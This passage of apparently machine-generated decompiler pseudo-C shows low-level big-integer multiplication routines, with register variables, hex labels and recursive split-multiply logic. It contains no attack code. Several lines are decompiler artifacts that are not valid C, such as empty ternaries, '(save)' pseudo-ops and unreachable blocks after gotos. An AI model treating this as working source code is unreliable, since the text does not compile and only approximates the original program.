	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    edi = A18;
    Vfffffffc = A8 + A10 * 4 + edi * 4 - 4;
    if(edi <= 31) {
        if(edi == 0) {
            eax = 0;
            goto L08058dd1;
        }
        eax = *A14;
        if(eax <= 1) {
            != ? 0x8058830 : ;
            ebx = 0;
            if(A10 > 0) {
                if(eax = A10 & 3) {
                    goto L080587fc;
                }
                if(eax > 1) {
                    if(eax > 2) {
                        *A8 = *Ac;
                        ebx = 1;
                    }
                    eax = *(Ac + ebx * 4);
                    *(A8 + ebx * 4) = eax;
                    ebx = ebx + 1;
                }
                eax = *(Ac + ebx * 4);
                *(A8 + ebx * 4) = eax;
                ebx = ebx + 1;
                if(A10 != ebx) {
L080587fc:
                    do {
                        edi = Ac;
                        eax = *(edi + ebx * 4);
                        ecx = A8;
                        *(ecx + ebx * 4) = eax;
                        eax = ebx + 1;
                        *(ecx + eax * 4) = *(edi + eax * 4);
                        eax = ebx + 2;
                        *(ecx + eax * 4) = *(edi + eax * 4);
                        eax = ebx + 3;
                        *(ecx + eax * 4) = *(edi + eax * 4);
                        ebx = ebx + 4;
                    } while(A10 != ebx);
                    goto L0805889a;
                    eax = 0;
                    if(A10 > 0) {
                        if(edx = A10 & 3) {
                            goto L08058870;
                        }
                        if(edx > 1) {
                            if(edx > 2) {
                                *A8 = 0;
                                eax = 1;
                            }
                            *(A8 + eax * 4) = 0;
                            eax = eax + 1;
                        }
                        *(A8 + eax * 4) = 0;
                        eax = eax + 1;
                        if(A10 != eax) {
L08058870:
                            ecx = A8;
                            *(ecx + eax * 4) = 0;
                            *(ecx + eax * 4 + 4) = 0;
                            *(ecx + eax * 4 + 8) = 0;
                            *(ecx + eax * 4 + 12) = 0;
                            eax = eax + 4;
                            if(A10 != eax) {
                                goto L08058870;
                            }
                        }
                    }
                }
            }
L0805889a:
            edx = 0;
        } else {
            edx = L08058DE0(A8, Ac, A10, eax);
        }
        edi = A8;
        *(edi + A10 * 4) = edx;
        A8 = edi + 4;
        esi = 1;
        if(A18 > 1) {
            if(!(A18 & 1)) {
                eax = *(A14 + 4);
                if(eax <= 1) {
                    edx = 0;
                    if(eax != 1) {
                        goto L0805891b;
                    }
                    (save)A10;
                    (save)Ac;
                    ecx = A8;
                    (save)ecx;
                    (save)ecx;
                    eax = L08066380();
                } else {
                    eax = L08066420(A8, Ac, A10, eax);
                }
                edx = eax;
L0805891b:
                edi = A8;
                *(edi + A10 * 4) = edx;
                A8 = edi + 4;
                esi = esi + 1;
                if(A18 == esi) {
                    goto L080589d2;
                }
            }
            do {
                eax = *(A14 + esi * 4);
                if(eax > 1) {
                    eax = L08066420(A8, Ac, A10, eax);
                } else {
                    edx = 0;
                    if(eax != 1) {
                        goto L08058973;
                    }
                    (save)A10;
                    (save)Ac;
                    edi = A8;
                    (save)edi;
                    (save)edi;
                    eax = L08066380();
                }
                edx = eax;
L08058973:
                *(A8 + A10 * 4) = edx;
                ebx = A8 + 4;
                eax = *(A14 + esi * 4 + 4);
                if(eax > 1) {
                    eax = L08066420(ebx, Ac, A10, eax);
                } else {
                    edx = 0;
                    if(eax != 1) {
                        goto L080589bc;
                    }
                    (save)A10;
                    (save)Ac;
                    (save)ebx;
                    (save)ebx;
                    eax = L08066380();
                }
                edx = eax;
L080589bc:
                *(ebx + A10 * 4) = edx;
                A8 = A8 + 8;
                esi = esi + 2;
            } while(A18 != esi);
        }
L080589d2:
        eax = edx;
        goto L08058dd1;
L080589dc:
        L08058E20(A8, Ac, A14, A18);
    } else {
        edi = A18;
        esp = esp - edi * 8;
        Vfffffff8 = esp;
        if(edi <= 31) {
            goto L080589dc;
        }
        L08059048(A8, Ac, A14, edi, esp);
    }
    edi = A18;
    eax = edi * 4;
    A8 = A8 + eax;
    Ac = Ac + eax;
    A10 = A10 - edi;
    if(A10 >= edi) {
        esp = esp - edi * 8;
        Vfffffff4 = esp;
        do {
            if(A18 <= 31) {
                L08058E20(Vfffffff4, Ac, A14, A18);
            } else {
                L08059048(Vfffffff4, Ac, A14, A18, Vfffffff8);
            }
            edi = A8;
            Vffffffec = L08066380(edi, edi, Vfffffff4, A18);
            ecx = A18;
            eax = ecx * 4;
            esi = A8 + eax;
            ebx = Vfffffff4 + eax;
            Vfffffff0 = ecx;
            edx = *ebx;
            ebx = ebx + 4;
            eax = Vffffffec + edx;
            *esi = eax;
            esi = esi + 4;
            if(eax < edx) {
                Vfffffff0 = ecx;
                if(!(ecx = ecx - 1)) {
                    eax = ~ecx & 3;
                    if(ecx > 0) {
                        if(eax == 0) {
                            goto L08058b28;
                        }
                        if(eax < 3) {
                            if(eax < 2) {
                                edx = *ebx + 1;
                                ebx = ebx + 4;
                                *esi = edx;
                                esi = esi + 4;
                                if(edx != 0) {
                                    goto L08058b98;
                                }
                                Vfffffff0 = A18 + -2;
                            }
                            edx = *ebx + 1;
                            ebx = ebx + 4;
                            *esi = edx;
                            esi = esi + 4;
                            if(edx != 0) {
                                goto L08058b98;
                            }
                            Vfffffff0 = Vfffffff0 - 1;
                        }
                    }
                    edx = *ebx + 1;
                    ebx = ebx + 4;
                    *esi = edx;
                    esi = esi + 4;
                    if(edx != 0) {
                        goto L08058b98;
                    }
                    if(!(Vfffffff0 = Vfffffff0 - 1)) {
L08058b28:
                        do {
                            edx = *ebx + 1;
                            ebx = ebx + 4;
                            *esi = edx;
                            esi = esi + 4;
                            if(edx != 0) {
                                goto L08058b98;
                            }
                            Vfffffff0 = Vfffffff0 - 1;
                            edx = *ebx + 1;
                            ebx = ebx + 4;
                            *esi = edx;
                            esi = esi + 4;
                            if(edx != 0) {
                                goto L08058b98;
                            }
                            Vfffffff0 = Vfffffff0 - 1;
                            edx = *ebx + 1;
                            ebx = ebx + 4;
                            *esi = edx;
                            esi = esi + 4;
                            if(edx != 0) {
                                goto L08058b98;
                            }
                            Vfffffff0 = Vfffffff0 - 1;
                            edx = *ebx + 1;
                            ebx = ebx + 4;
                            *esi = edx;
                            esi = esi + 4;
                            if(edx != 0) {
                                goto L08058b98;
                            }
                        } while(Vfffffff0 = Vfffffff0 - 1);
                    }
                }
            } else {
L08058b98:
                if(esi != ebx) {
                    Vffffffec = 0;
                    ecx = Vfffffff0 - 1;
                    Vfffffff0 = ecx;
                    if(Vffffffec < ecx) {
                        if(!(eax = ecx & 3)) {
                            if(eax > 1) {
                                if(eax > 2) {
                                    *esi = *ebx;
                                    Vffffffec = Vffffffec + 1;
                                }
                                edi = Vffffffec;
                                *(esi + edi * 4) = *(ebx + edi * 4);
                                Vffffffec = edi + 1;
                            }
                            ecx = Vffffffec;
                            *(esi + ecx * 4) = *(ebx + ecx * 4);
                            ecx = ecx + 1;
L08058c0e:
                            Vffffffec = ecx;
                            if(ecx == Vfffffff0) {
                                goto L08058c18;
                            }
                        }
                        ecx = Vffffffec;
                        *(esi + ecx * 4) = *(ebx + ecx * 4);
                        eax = Vffffffec + 1;
                        *(esi + eax * 4) = *(ebx + eax * 4);
                        eax = Vffffffec + 2;
                        *(esi + eax * 4) = *(ebx + eax * 4);
                        eax = Vffffffec + 3;
                        *(esi + eax * 4) = *(ebx + eax * 4);
                        ecx = ecx + 4;
                        goto L08058c0e;
                    }
                }
            }
L08058c18:
            ecx = A18;
            eax = ecx * 4;
            A8 = A8 + eax;
            Ac = Ac + eax;
            A10 = A10 - ecx;
        } while(A10 >= ecx);
    }
    if(A10 != 0) {
        (save)A10;
        (save)Ac;
        (save)A18;
        (save)A14;
        edi = Vfffffff8;
        (save)edi;
        L0805876C();
        edi = A8;
        Vffffffec = L08066380(edi, edi, edi, A18);
        eax = A18 * 4;
        esi = A8 + eax;
        ebx = Vfffffff8 + eax;
        Vfffffff0 = A10;
        edx = *ebx;
        ebx = ebx + 4;
        eax = Vffffffec + edx;
        *esi = eax;
        esi = esi + 4;
        if(eax >= edx) {
            goto L08058d4c;
        }
        if(!(Vfffffff0 = Vfffffff0 - 1)) {
            eax = ~Vfffffff0 & 3;
            if(Vfffffff0 > 0) {
                if(eax == 0) {
                    goto L08058cfc;
                }
                if(eax < 3) {
                    if(eax < 2) {
                        edx = *ebx + 1;
                        ebx = ebx + 4;
                        *esi = edx;
                        esi = esi + 4;
                        if(edx != 0) {
                            goto L08058d4c;
                        }
                        Vfffffff0 = Vfffffff0 - 1;
                    }
                    edx = *ebx + 1;
                    ebx = ebx + 4;
                    *esi = edx;
                    esi = esi + 4;
                    if(edx != 0) {
                        goto L08058d4c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                }
            }
            edx = *ebx + 1;
            ebx = ebx + 4;
            *esi = edx;
            esi = esi + 4;
            if(edx != 0) {
                goto L08058d4c;
            }
            if(!(Vfffffff0 = Vfffffff0 - 1)) {
L08058cfc:
                do {
                    edx = *ebx + 1;
                    ebx = ebx + 4;
                    *esi = edx;
                    esi = esi + 4;
                    if(edx != 0) {
                        goto L08058d4c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *ebx + 1;
                    ebx = ebx + 4;
                    *esi = edx;
                    esi = esi + 4;
                    if(edx != 0) {
                        goto L08058d4c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *ebx + 1;
                    ebx = ebx + 4;
                    *esi = edx;
                    esi = esi + 4;
                    if(edx != 0) {
                        goto L08058d4c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *ebx + 1;
                    ebx = ebx + 4;
                    *esi = edx;
                    esi = esi + 4;
                    if(edx != 0) {
                        goto L08058d4c;
                    }
                } while(Vfffffff0 = Vfffffff0 - 1);
                goto L08058dcc;
L08058d4c:
                if(esi != ebx) {
                    Vffffffec = 0;
                    ecx = Vfffffff0 - 1;
                    Vfffffff0 = ecx;
                    if(Vffffffec < ecx) {
                        if(!(eax = ecx & 3)) {
                            if(eax > 1) {
                                if(eax > 2) {
                                    *esi = *ebx;
                                    Vffffffec = Vffffffec + 1;
                                }
                                edi = Vffffffec;
                                *(esi + edi * 4) = *(ebx + edi * 4);
                                Vffffffec = edi + 1;
                            }
                            ecx = Vffffffec;
                            *(esi + ecx * 4) = *(ebx + ecx * 4);
                            ecx = ecx + 1;
                        } else {
L08058d94:
                            ecx = Vffffffec;
                            *(esi + ecx * 4) = *(ebx + ecx * 4);
                            edx = Vffffffec + 1;
                            *(esi + edx * 4) = *(ebx + edx * 4);
                            edx = Vffffffec + 2;
                            *(esi + edx * 4) = *(ebx + edx * 4);
                            edx = Vffffffec + 3;
                            *(esi + edx * 4) = *(ebx + edx * 4);
                            ecx = ecx + 4;
                        }
                        Vffffffec = ecx;
                        if(ecx != Vfffffff0) {
                            goto L08058d94;
                        }
                    }
                }
            }
        }
    }
L08058dcc:
    eax = *Vfffffffc;
L08058dd1:
    esp = ebp - 32;
}



L08058DE0(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    (save)ebp;
    edi = A8 + A10 * 4;
    esi = Ac + A10 * 4;
    ecx = ~A10;
    edx = 0;
    do {
        ebp = edx;
        eax = *(esi + ecx * 4);
        asm("mul ebx");
        eax = eax + ebp;
        asm("adc edx,+0x0");
        *(edi + ecx * 4) = eax;
    } while(ecx = ecx + 1);
    eax = edx;
    (restore)ebp;
}



L08058E20(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    eax = *A10;
    if(eax <= 1) {
        != ? 0x8058eb0 : ;
        ecx = 0;
        if(A14 > 0) {
            if(eax = A14 & 3) {
                goto L08058e80;
            }
            if(eax > 1) {
                if(eax > 2) {
                    *ebx = *Ac;
                    ecx = 1;
                }
                *(ebx + ecx * 4) = *(Ac + ecx * 4);
                ecx = ecx + 1;
            }
            eax = *(Ac + ecx * 4);
            *(ebx + ecx * 4) = eax;
            ecx = ecx + 1;
            if(A14 != ecx) {
L08058e80:
                do {
                    esi = Ac;
                    *(ebx + ecx * 4) = *(esi + ecx * 4);
                    eax = ecx + 1;
                    *(ebx + eax * 4) = *(esi + eax * 4);
                    eax = ecx + 2;
                    *(ebx + eax * 4) = *(esi + eax * 4);
                    eax = ecx + 3;
                    *(ebx + eax * 4) = *(esi + eax * 4);
                    ecx = ecx + 4;
                } while(A14 != ecx);
                goto L08058f0f;
                eax = 0;
                if(A14 > 0) {
                    if(edx = A14 & 3) {
                        goto L08058ee8;
                    }
                    if(edx > 1) {
                        if(edx > 2) {
                            *ebx = 0;
                            eax = 1;
                        }
                        *(ebx + eax * 4) = 0;
                        eax = eax + 1;
                    }
                    *(ebx + eax * 4) = 0;
                    eax = eax + 1;
                    if(A14 != eax) {
L08058ee8:
                        *(ebx + eax * 4) = 0;
                        *(ebx + eax * 4 + 4) = 0;
                        *(ebx + eax * 4 + 8) = 0;
                        *(ebx + eax * 4 + 12) = 0;
                        eax = eax + 4;
                        if(A14 != eax) {
                            goto L08058ee8;
                        }
                    }
                }
            }
        }
L08058f0f:
        edx = 0;
    } else {
        eax = L08058DE0(ebx, Ac, A14, eax);
        edx = eax;
    }
    edi = A14;
    *(ebx + edi * 4) = edx;
    ebx = ebx + 4;
    Vfffffffc = 1;
    if(Vfffffffc < edi) {
        if(!(edi & 1)) {
            eax = *(A10 + 4);
            if(eax <= 1) {
                edx = 0;
                if(eax != 1) {
                    goto L08058f80;
                }
                (save)edi;
                (save)Ac;
                (save)ebx;
                (save)ebx;
                eax = L08066380();
            } else {
                eax = L08066420(ebx, Ac, A14, eax);
            }
            edx = eax;
L08058f80:
            esi = A14;
            *(ebx + esi * 4) = edx;
            ebx = ebx + 4;
            Vfffffffc = Vfffffffc + 1;
            if(Vfffffffc == esi) {
                goto L0805903c;
            }
        }
        do {
            eax = *(A10 + Vfffffffc * 4);
            if(eax > 1) {
                eax = L08066420(ebx, Ac, A14, eax);
            } else {
                edx = 0;
                if(eax != 1) {
                    goto L08058fd4;
                }
                (save)A14;
                (save)Ac;
                (save)ebx;
                (save)ebx;
                eax = L08066380();
            }
            edx = eax;
L08058fd4:
            *(ebx + A14 * 4) = edx;
            Vfffffff8 = ebx + 4;
            eax = *(A10 + Vfffffffc * 4 + 4);
            if(eax > 1) {
                eax = L08066420(Vfffffff8, Ac, A14, eax);
            } else {
                edx = 0;
                if(eax != 1) {
                    goto L08059023;
                }
                (save)A14;
                (save)Ac;
                edi = Vfffffff8;
                (save)edi;
                (save)edi;
                eax = L08066380();
            }
            edx = eax;
L08059023:
            edi = A14;
            *(Vfffffff8 + edi * 4) = edx;
            ebx = ebx + 8;
            Vfffffffc = Vfffffffc + 2;
        } while(Vfffffffc != edi);
    }
L0805903c:
    esp = ebp - 20;
}



L08059048(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = A14;
    if(!(esi & 1)) {
        esi = esi - 1;
        Vffffffec = esi;
        if(esi > 31) {
            L08059048(A8, Ac, A10, esi, A18);
L08059082:
            edi = Vffffffec;
            (save) *(A10 + edi * 4);
            (save)edi;
            (save)Ac;
            esi = Vffffffec;
            edi = A8;
            ebx = edi + esi * 4;
            (save)ebx;
            *(edi + (Vffffffec + Vffffffec) * 4) = L08066420();
            (save) *(Ac + esi * 4);
            (save)A14;
            (save)A10;
            (save)ebx;
            eax = A14 + Vffffffec;
            *(A8 + eax * 4) = L08066420();
            goto L08059710;
        }
        L08058E20(A8, Ac, A10, Vffffffec);
        goto L08059082;
L080590f0:
        edi = Vfffffffc;
        eax = edi * 4;
        L08058E20(A8 + A14 * 4, eax + Ac, A10 + eax, edi);
    } else {
        esi = A14 >> 1;
        Vfffffffc = esi;
        if(esi <= 31) {
            goto L080590f0;
        }
        eax = esi * 4;
        L08059048(A8 + A14 * 4, eax + Ac, A10 + eax, esi, A18);
    }
    esi = Vfffffffc;
    edi = Ac;
    ebx = edi + esi * 4;
    if(L08057F48(ebx, edi, esi) >= 0) {
        (save)esi;
        (save)edi;
        (save)ebx;
        (save)A8;
        L0805A010();
        Vfffffff4 = 0;
    } else {
        edi = Vfffffffc;
        esi = Ac;
        L0805A010(A8, esi, esi + edi * 4, edi);
        Vfffffff4 = 1;
    }
    esi = Vfffffffc;
    esi = esi << 2;
    Vffffffec = esi;
    ebx = A10 + Vffffffec;
    if(L08057F48(ebx, A10, esi) >= 0) {
        (save)Vfffffffc;
        (save)A10;
        (save)ebx;
        (save)A8 + Vffffffec;
        L0805A010();
        Vfffffff4 = Vfffffff4 ^ 1;
        goto L08059216;
L080591dc:
        edi = Vfffffffc;
        esi = A8;
        L08058E20(A18, esi, esi + edi * 4, edi);
    } else {
        esi = Vfffffffc;
        eax = esi * 4;
        L0805A010(eax + A8, A10, A10 + eax, esi);
L08059216:
        if(Vfffffffc <= 31) {
            goto L080591dc;
        }
        esi = Vfffffffc;
        edi = A8;
        L08059048(A18, edi, edi + esi * 4, esi, A18 + A14 * 4);
    }
    if(Vfffffffc > 0) {
        edx = A14 * 4;
        esi = Vfffffffc;
        ecx = esi * 4;
        ebx = edx + ecx;
        if(eax = esi & 3) {
            goto L080592a4;
        }
        if(eax > 1) {
            if(eax > 2) {
                edi = A8;
                *(edi + ecx) = *(edi + edx);
                edx = edx + 4;
                ecx = ecx + 4;
            }
            esi = A8;
            *(esi + ecx) = *(esi + edx);
            edx = edx + 4;
            ecx = ecx + 4;
        }
        edi = A8;
        *(edi + ecx) = *(edi + edx);
        edx = edx + 4;
        ecx = ecx + 4;
        if(edx != ebx) {
L080592a4:
            do {
                esi = A8;
                *(esi + ecx) = *(esi + edx);
                *(esi + ecx + 4) = *(esi + edx + 4);
                *(esi + ecx + 8) = *(esi + edx + 8);
                *(esi + ecx + 12) = *(esi + edx + 12);
                edx = edx + 16;
                ecx = ecx + 16;
            } while(edx != ebx);
        }
    }
    edx = A8 + A14 * 4;
    ebx = Vfffffffc * 4;
    Vfffffff8 = L08066380(edx, edx, ebx + edx, Vfffffffc);
    if(Vfffffff4 != 0) {
        (save)A14;
        (save)A18;
        eax = A8 + ebx;
        (save)eax;
        (save)eax;
        Vfffffff8 = Vfffffff8 - L0805A010();
        goto L0805934f;
L08059318:
        L08058E20(A18, Ac, A10, Vfffffffc);
    } else {
        eax = A8 + Vfffffffc * 4;
        Vfffffff8 = Vfffffff8 + L08066380(eax, eax, A18, A14);
L0805934f:
        if(Vfffffffc <= 31) {
            goto L08059318;
        }
        L08059048(A18, Ac, A10, Vfffffffc, A18 + A14 * 4);
    }
    ebx = A8 + Vfffffffc * 4;
    Vfffffff8 = Vfffffff8 + L08066380(ebx, ebx, A18, A14);
    if(Vfffffff8 != 0) {
        ebx = ebx + A14 * 4;
        esi = Vfffffffc;
        Vfffffff0 = esi;
        edx = *ebx;
        Vffffffec = ebx + 4;
        eax = Vfffffff8 + edx;
        *ebx = eax;
        ebx = Vffffffec;
        if(eax >= edx) {
            goto L0805949c;
        }
        Vfffffff0 = esi;
        if(!(esi = esi - 1)) {
            eax = ~esi & 3;
            if(esi > 0) {
                if(eax == 0) {
                    goto L08059440;
                }
                if(eax < 3) {
                    if(eax < 2) {
                        edx = *ebx + 1;
                        Vffffffec = ebx + 4;
                        *ebx = edx;
                        ebx = Vffffffec;
                        if(edx != 0) {
                            goto L0805949c;
                        }
                        Vfffffff0 = Vfffffffc + -2;
                    }
                    esi = Vffffffec;
                    edx = *esi + 1;
                    Vffffffec = esi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L0805949c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                }
            }
            edi = Vffffffec;
            edx = *edi + 1;
            Vffffffec = edi + 4;
            *ebx = edx;
            ebx = ebx + 4;
            if(edx != 0) {
                goto L0805949c;
            }
            if(!(Vfffffff0 = Vfffffff0 - 1)) {
L08059440:
                do {
                    esi = Vffffffec;
                    edx = *esi + 1;
                    esi = esi + 4;
                    Vffffffec = esi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L0805949c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *esi + 1;
                    esi = esi + 4;
                    Vffffffec = esi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L0805949c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *esi + 1;
                    esi = esi + 4;
                    Vffffffec = esi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L0805949c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *esi + 1;
                    Vffffffec = esi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L0805949c;
                    }
                } while(Vfffffff0 = Vfffffff0 - 1);
                goto L0805950c;
L0805949c:
                if(Vffffffec != ebx) {
                    ecx = 0;
                    edi = Vfffffff0 - 1;
                    Vfffffff0 = edi;
                    if(0 < edi) {
                        if(eax = edi & 3) {
                            goto L080594e0;
                        }
                        if(eax > 1) {
                            if(eax > 2) {
                                *ebx = *Vffffffec;
                                ecx = 1;
                            }
                            *(ebx + ecx * 4) = *(Vffffffec + ecx * 4);
                            ecx = ecx + 1;
                        }
                        *(ebx + ecx * 4) = *(Vffffffec + ecx * 4);
                        ecx = ecx + 1;
                        if(Vfffffff0 != ecx) {
L080594e0:
                            do {
                                edi = Vffffffec;
                                *(ebx + ecx * 4) = *(edi + ecx * 4);
                                edx = ecx + 1;
                                *(ebx + edx * 4) = *(edi + edx * 4);
                                edx = ecx + 2;
                                *(ebx + edx * 4) = *(edi + edx * 4);
                                edx = ecx + 3;
                                *(ebx + edx * 4) = *(edi + edx * 4);
                                ecx = ecx + 4;
                            } while(Vfffffff0 != ecx);
                        }
                    }
                }
            }
        }
    }
L0805950c:
    ecx = 0;
    if(Vfffffffc > 0) {
        if(eax = Vfffffffc & 3) {
            goto L08059550;
        }
        if(eax > 1) {
            if(eax > 2) {
                *A8 = *A18;
                ecx = 1;
            }
            eax = *(A18 + ecx * 4);
            *(A8 + ecx * 4) = eax;
            ecx = ecx + 1;
        }
        eax = *(A18 + ecx * 4);
        *(A8 + ecx * 4) = eax;
        ecx = ecx + 1;
        if(Vfffffffc != ecx) {
L08059550:
            do {
                esi = A18;
                eax = *(esi + ecx * 4);
                edi = A8;
                *(edi + ecx * 4) = eax;
                eax = ecx + 1;
                *(edi + eax * 4) = *(esi + eax * 4);
                eax = ecx + 2;
                *(edi + eax * 4) = *(esi + eax * 4);
                eax = ecx + 3;
                *(edi + eax * 4) = *(esi + eax * 4);
                ecx = ecx + 4;
            } while(Vfffffffc != ecx);
        }
    }
    esi = Vfffffffc;
    eax = esi * 4;
    eax = eax + A8;
    eax = L08066380(eax, eax, A18 + eax, esi);
    Vfffffff8 = eax;
    if(eax != 0) {
        edi = A14;
        ebx = A8 + edi * 4;
        Vfffffff0 = edi;
        edx = *ebx;
        Vffffffec = ebx + 4;
        eax = edx + 1;
        *ebx = eax;
        ebx = Vffffffec;
        if(eax >= edx) {
            goto L080596a0;
        }
        if(!(Vfffffff0 = Vfffffff0 - 1)) {
            eax = ~Vfffffff0 & 3;
            if(Vfffffff0 > 0) {
                if(eax == 0) {
                    goto L08059644;
                }
                if(eax < 3) {
                    if(eax < 2) {
                        edx = *ebx + 1;
                        Vffffffec = ebx + 4;
                        *ebx = edx;
                        ebx = Vffffffec;
                        if(edx != 0) {
                            goto L080596a0;
                        }
                        Vfffffff0 = Vfffffff0 - 1;
                    }
                    edi = Vffffffec;
                    edx = *edi + 1;
                    Vffffffec = edi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L080596a0;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                }
            }
            esi = Vffffffec;
            edx = *esi + 1;
            Vffffffec = esi + 4;
            *ebx = edx;
            ebx = ebx + 4;
            if(edx != 0) {
                goto L080596a0;
            }
            if(!(Vfffffff0 = Vfffffff0 - 1)) {
L08059644:
                do {
                    edi = Vffffffec;
                    edx = *edi + 1;
                    edi = edi + 4;
                    Vffffffec = edi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L080596a0;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *edi + 1;
                    edi = edi + 4;
                    Vffffffec = edi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L080596a0;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *edi + 1;
                    edi = edi + 4;
                    Vffffffec = edi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L080596a0;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *edi + 1;
                    Vffffffec = edi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L080596a0;
                    }
                } while(Vfffffff0 = Vfffffff0 - 1);
                goto L08059710;
L080596a0:
                if(Vffffffec != ebx) {
                    ecx = 0;
                    esi = Vfffffff0 - 1;
                    Vfffffff0 = esi;
                    if(0 < esi) {
                        if(eax = esi & 3) {
                            goto L080596e4;
                        }
                        if(eax > 1) {
                            if(eax > 2) {
                                *ebx = *Vffffffec;
                                ecx = 1;
                            }
                            *(ebx + ecx * 4) = *(Vffffffec + ecx * 4);
                            ecx = ecx + 1;
                        }
                        eax = *(Vffffffec + ecx * 4);
                        *(ebx + ecx * 4) = eax;
                        ecx = ecx + 1;
                        if(Vfffffff0 != ecx) {
L080596e4:
                            do {
                                esi = Vffffffec;
                                *(ebx + ecx * 4) = *(esi + ecx * 4);
                                edx = ecx + 1;
                                *(ebx + edx * 4) = *(esi + edx * 4);
                                edx = ecx + 2;
                                *(ebx + edx * 4) = *(esi + edx * 4);
                                edx = ecx + 3;
                                eax = *(esi + edx * 4);
                                *(ebx + edx * 4) = eax;
                                ecx = ecx + 4;
                            } while(Vfffffff0 != ecx);
                        }
                    }
                }
            }
        }
    }
L08059710:
    esp = ebp - 32;
}



L0805971C(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    eax = *Ac;
    if(eax <= 1) {
        != ? 0x80597ac : ;
        ecx = 0;
        if(A10 > 0) {
            if(eax = A10 & 3) {
                goto L0805977c;
            }
            if(eax > 1) {
                if(eax > 2) {
                    *ebx = 1;
                    ecx = 1;
                }
                *(ebx + ecx * 4) = *(Ac + ecx * 4);
                ecx = ecx + 1;
            }
            eax = *(Ac + ecx * 4);
            *(ebx + ecx * 4) = eax;
            ecx = ecx + 1;
            if(A10 != ecx) {
L0805977c:
                do {
                    edi = Ac;
                    *(ebx + ecx * 4) = *(edi + ecx * 4);
                    eax = ecx + 1;
                    *(ebx + eax * 4) = *(edi + eax * 4);
                    eax = ecx + 2;
                    *(ebx + eax * 4) = *(edi + eax * 4);
                    eax = ecx + 3;
                    *(ebx + eax * 4) = *(edi + eax * 4);
                    ecx = ecx + 4;
                } while(A10 != ecx);
                goto L0805980b;
                eax = 0;
                if(A10 > 0) {
                    if(edx = A10 & 3) {
                        goto L080597e4;
                    }
                    if(edx > 1) {
                        if(edx > 2) {
                            *ebx = 0;
                            eax = 1;
                        }
                        *(ebx + eax * 4) = 0;
                        eax = eax + 1;
                    }
                    *(ebx + eax * 4) = 0;
                    eax = eax + 1;
                    if(A10 != eax) {
L080597e4:
                        *(ebx + eax * 4) = 0;
                        *(ebx + eax * 4 + 4) = 0;
                        *(ebx + eax * 4 + 8) = 0;
                        *(ebx + eax * 4 + 12) = 0;
                        eax = eax + 4;
                        if(A10 != eax) {
                            goto L080597e4;
                        }
                    }
                }
            }
        }
L0805980b:
        edx = 0;
    } else {
        eax = L08058DE0(ebx, Ac, A10, eax);
        edx = eax;
    }
    esi = A10;
    *(ebx + esi * 4) = edx;
    ebx = ebx + 4;
    Vfffffffc = 1;
    if(Vfffffffc < esi) {
        if(!(esi & 1)) {
            edi = Ac;
            eax = *(edi + 4);
            if(eax <= 1) {
                edx = 0;
                if(eax != 1) {
                    goto L08059878;
                }
                (save)esi;
                (save)edi;
                (save)ebx;
                (save)ebx;
                eax = L08066380();
            } else {
                eax = L08066420(ebx, Ac, A10, eax);
            }
            edx = eax;
L08059878:
            esi = A10;
            *(ebx + esi * 4) = edx;
            ebx = ebx + 4;
            Vfffffffc = Vfffffffc + 1;
            if(Vfffffffc == esi) {
                goto L0805992c;
            }
        }
        do {
            esi = Ac;
            eax = *(esi + Vfffffffc * 4);
            if(eax > 1) {
                eax = L08066420(ebx, Ac, A10, eax);
            } else {
                edx = 0;
                if(eax != 1) {
                    goto L080598c8;
                }
                (save)A10;
                (save)esi;
                (save)ebx;
                (save)ebx;
                eax = L08066380();
            }
            edx = eax;
L080598c8:
            *(ebx + A10 * 4) = edx;
            Vfffffff8 = ebx + 4;
            edi = Ac;
            eax = *(edi + Vfffffffc * 4 + 4);
            if(eax > 1) {
                eax = L08066420(Vfffffff8, Ac, A10, eax);
            } else {
                edx = 0;
